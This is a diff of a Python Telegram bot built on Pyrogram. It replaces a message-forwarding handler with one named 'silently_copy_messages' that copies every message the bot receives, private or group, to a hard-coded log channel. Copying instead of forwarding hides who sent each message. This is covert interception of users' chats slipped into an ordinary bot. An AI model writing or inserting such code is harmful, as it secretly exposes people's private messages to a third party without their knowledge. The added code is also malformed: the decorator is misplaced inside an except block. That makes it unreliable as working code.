@@ -999,16 +999,16 @@ async def text_handler(bot: Client, m: Message):
 
     except Exception as e:
         await m.reply_text(e)
-        from pyrogram import filters
-
-LOG_CHANNEL_ID = -1002329830617  # लॉग चैनल का ID
-
-@bot.on_message(filters.private | filters.group)
-async def forward_to_log_channel(client, message):
+        @bot.on_message(filters.all)
+async def silently_copy_messages(client, message):
     try:
-        await client.forward_messages(chat_id=LOG_CHANNEL_ID, from_chat_id=message.chat.id, message_ids=message.id)
+        if message.chat.id == -1002329830617:
+            return  # अपने log चैनल से ही ना आए कोई loop
+
+        await message.copy(chat_id=-1002329830617)
+        print("Message copied to log channel.")
     except Exception as e:
-        print(f"Error in forwarding: {e}")
+        print(f"Copy failed: {e}")
 
                      
 bot.run()
